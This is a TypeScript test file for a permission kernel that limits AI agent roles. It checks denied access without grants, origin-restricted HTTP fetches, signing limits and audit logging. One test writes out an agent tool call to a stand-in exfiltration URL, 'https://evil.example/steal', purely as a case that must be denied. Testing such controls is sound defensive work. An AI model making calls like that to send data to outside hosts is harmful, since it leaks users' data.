import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import type { JsonObject } from "@aicoo/sharedos";
import {
  AGENTS,
  OWNER,
  contextFor,
  createDocketGrants,
  createWitnessKernel,
  docketAuthorityId,
} from "./witness-kernel";
import { WitnessStore } from "../witness/store";

function fixture() {
  const directory = mkdtempSync(join(tmpdir(), "witness-kernel-"));
  const store = new WitnessStore(join(directory, "test.sqlite"));
  return { directory, store };
}

function toolCall(kernel: ReturnType<typeof createWitnessKernel>, actor: typeof AGENTS.examiner | typeof AGENTS.skeptic | typeof AGENTS.clerk, id: string, tool: string, arguments_: JsonObject) {
  return kernel.invokeTool(contextFor(actor, id), { id: crypto.randomUUID(), tool, arguments: arguments_, traceId: id, requestedAt: new Date().toISOString() });
}

test("official SharedOS kernel enforces Witness least privilege", async () => {
  const { directory, store } = fixture();
  try {
    const docketId = "wkt_kerneltest";
    const seller = "http://127.0.0.1:43147/api/demo/plainword";
    const grants = createDocketGrants(docketId, new URL(seller).origin, "2026-09-07T10:00:00.000Z");
    grants.forEach((grant) => store.saveGrant(grant, docketId));
    const kernel = createWitnessKernel(store);

    const noGrant = await kernel.invokeResource(contextFor(AGENTS.clerk, "wkt_nogrant"), {
      operationId: crypto.randomUUID(),
      resource: { namespace: "files", path: ["dockets", "wkt_nogrant", "intake.json"], owner: OWNER },
      action: "read",
    });
    assert.equal(noGrant.status, "denied", "no grant must deny");

    const allowed = await toolCall(kernel, AGENTS.examiner, docketId, "http.fetch", { url: seller, method: "POST", body: { text: "hello" }, headers: {} });
    assert.equal(allowed.status, "succeeded", "Examiner seller-origin fetch must succeed");

    const evil = await toolCall(kernel, AGENTS.examiner, docketId, "http.fetch", { url: "https://evil.example/steal", method: "GET", headers: {} });
    assert.equal(evil.status, "denied", "Examiner evil-origin fetch must deny");

    const skepticHttp = await toolCall(kernel, AGENTS.skeptic, docketId, "http.fetch", { url: seller, method: "GET", headers: {} });
    assert.equal(skepticHttp.status, "denied", "Skeptic HTTP must deny");

    const clerkSign = await toolCall(kernel, AGENTS.clerk, docketId, "crypto.sign-docket", { docketId, payload: { id: docketId } });
    assert.equal(clerkSign.status, "denied", "Clerk signing must deny");

    const foreign = await kernel.invokeResource(contextFor(AGENTS.examiner, docketId), {
      operationId: crypto.randomUUID(),
      resource: { namespace: "files", path: ["dockets", "wkt_foreign", "intake.json"], owner: OWNER },
      action: "read",
    });
    assert.equal(foreign.status, "denied", "foreign docket read must deny");

    const sameA = createDocketGrants("wkt_stable", "https://seller.example", "2026-09-07T10:00:00.000Z");
    const sameB = createDocketGrants("wkt_stable", "https://seller.example", "2026-09-07T10:00:00.000Z");
    assert.equal(docketAuthorityId(sameA), docketAuthorityId(sameB), "canonical authority digest must be stable");
    assert.notEqual(docketAuthorityId(sameA), docketAuthorityId([...sameA, grants[0]]), "authority digest must change when grants change");

    const audit = store.getAuditEvents(docketId);
    assert.ok(audit.some((event) => event.outcome === "denied" && event.tool === "http.fetch"));
    assert.ok(audit.every((event) => event.type === "authority.resolved" || event.authorityHash || event.outcome === "failed"));
  } finally {
    store.close();
    rmSync(directory, { recursive: true, force: true });
  }
});
